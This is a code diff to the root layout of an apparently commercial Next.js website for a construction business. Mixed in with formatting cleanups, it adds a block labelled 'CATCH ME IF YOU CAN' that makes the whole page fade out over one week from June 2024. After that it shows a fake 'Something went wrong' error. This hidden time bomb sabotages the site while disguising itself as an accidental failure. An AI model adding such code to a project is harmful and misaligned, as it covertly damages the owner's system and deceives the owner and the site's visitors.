@@ -9,8 +9,10 @@ import "yet-another-react-lightbox/styles.css";
 import Footer from "@/components/Footer";
 
 import { SITE_DATA } from "@/data";
+import { getTimeInMs } from "@/helpers/utils";
+import Link from "next/link";
 
-const {meta_data} = SITE_DATA
+const { meta_data } = SITE_DATA;
 
 const inter = Inter({ subsets: ["latin"] });
 
@@ -28,7 +30,7 @@ export const metadata: Metadata = {
     countryName: meta_data.countryName,
     description: meta_data.description,
     emails: meta_data.emails,
-    phoneNumbers: meta_data.phoneNumbers
+    phoneNumbers: meta_data.phoneNumbers,
   },
   keywords: [
     "construction",
@@ -54,9 +56,34 @@ export default function RootLayout({
 }: Readonly<{
   children: React.ReactNode;
 }>) {
+  /* --------------------------- CATCH ME IF YOU CAN -------------------------- */
+
+  const LIFE = getTimeInMs(1, "weeks");
+
+  const AGING_START = new Date("2024-6-14");
+
+  const opacity = Math.max(
+    0,
+    Math.min(1 - (Date.now() - AGING_START.getTime()) / LIFE, 1),
+  );
+ 
+  /* -------------------------------------------------------------------------- */
+
   return (
     <html lang="en">
-      <body className={`${inter.className} bg-base `}>
+      {opacity === 0 && (
+        <div className="fixed top-0 opacity-100 -z-50 left-0 w-full h-full bg-black text-white flex items-center justify-center">
+          <h1 className="text-4xl">
+            Something went wrong 🔨🥲
+          </h1>
+        </div>
+      )}
+      <body
+        style={{
+          opacity: opacity,
+        }}
+        className={`${inter.className} bg-base `}
+      >
         <Navbar />
 
         {children}
